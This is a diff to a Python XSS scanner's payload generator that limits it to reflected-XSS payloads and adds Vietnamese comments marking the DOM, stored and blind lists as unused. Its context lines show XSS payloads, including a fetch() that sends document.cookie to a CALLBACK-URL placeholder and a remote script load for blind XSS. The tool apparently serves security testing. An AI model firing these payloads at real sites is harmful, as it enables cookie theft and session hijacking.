@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 """
-Payload Generator for XSS (Cross-Site Scripting) Scanner
+Payload Generator for XSS (Cross-Site Scripting) Scanner - Reflected XSS only
 """
 
 
 class XSSPayloadGenerator:
     def __init__(self):
         self.reflected_payloads = []
+        # Các phương thức DOM, stored và blind vẫn giữ lại nhưng không được sử dụng
         self.dom_based_payloads = []
         self.stored_payloads = []
         self.blind_payloads = []
@@ -16,7 +17,7 @@ class XSSPayloadGenerator:
     def _init_payloads(self):
         """Initialize the payload lists with common XSS payloads"""
 
-        # Basic XSS payloads
+        # Basic XSS payloads - hiện tại chỉ sử dụng reflected XSS
         self.reflected_payloads = [
             # Simple alerts
             "<script>alert('XSS')</script>",
@@ -62,7 +63,7 @@ class XSSPayloadGenerator:
             "<script>eval(atob('YWxlcnQoMSk='))</script>"
         ]
 
-        # DOM-based XSS payloads
+        # DOM-based XSS payloads - Không sử dụng
         self.dom_based_payloads = [
             # Common DOM-based vectors
             "<img src=x onerror=alert(document.cookie)>",
@@ -84,7 +85,7 @@ class XSSPayloadGenerator:
             "'><img src=x onerror=alert(document.cookie)><'"
         ]
 
-        # Payloads for stored XSS testing
+        # Payloads for stored XSS testing - Không sử dụng
         self.stored_payloads = [
             # Long-term persistent payloads
             "<script>fetch('https://CALLBACK-URL?cookie='+encodeURIComponent(document.cookie))</script>",
@@ -100,7 +101,7 @@ class XSSPayloadGenerator:
             "<style>body{background:black !important;color:red !important;}</style>"
         ]
 
-        # Payloads for blind XSS testing
+        # Payloads for blind XSS testing - Không sử dụng
         self.blind_payloads = [
             # Callback URL based (replace CALLBACK-URL with your server)
             "<script src='https://CALLBACK-URL/UNIQUE-ID'></script>",
@@ -114,34 +115,25 @@ class XSSPayloadGenerator:
 
     def get_all_payloads(self):
         """
-        Get all XSS payloads
+        Get all XSS payloads - Chỉ sử dụng reflected payloads
 
         Returns:
-            list: Combined list of all XSS payloads
+            list: List of reflected XSS payloads
         """
-        all_payloads = []
-        all_payloads.extend(self.reflected_payloads)
-        all_payloads.extend(self.dom_based_payloads)
-
-        # Remove duplicates
-        unique_payloads = []
-        for payload in all_payloads:
-            if payload not in unique_payloads:
-                unique_payloads.append(payload)
-
-        return unique_payloads
+        # Chỉ trả về reflected payloads
+        return self.reflected_payloads
 
     def get_reflected_payloads(self):
-        """Get reflected XSS payloads"""
+        """Get reflected XSS payloads - Phương thức được sử dụng"""
         return self.reflected_payloads
 
     def get_dom_based_payloads(self):
-        """Get DOM-based XSS payloads"""
+        """Get DOM-based XSS payloads - Phương thức không được sử dụng"""
         return self.dom_based_payloads
 
     def get_stored_payloads(self, callback_url=None):
         """
-        Get stored XSS payloads, optionally with a callback URL
+        Get stored XSS payloads - Phương thức không được sử dụng
 
         Args:
             callback_url (str): URL for exfiltration in stored payloads
@@ -162,7 +154,7 @@ class XSSPayloadGenerator:
 
     def get_blind_payloads(self, callback_url=None, unique_id=None):
         """
-        Get blind XSS payloads, optionally with a callback URL
+        Get blind XSS payloads - Phương thức không được sử dụng
 
         Args:
             callback_url (str): URL for exfiltration in blind payloads
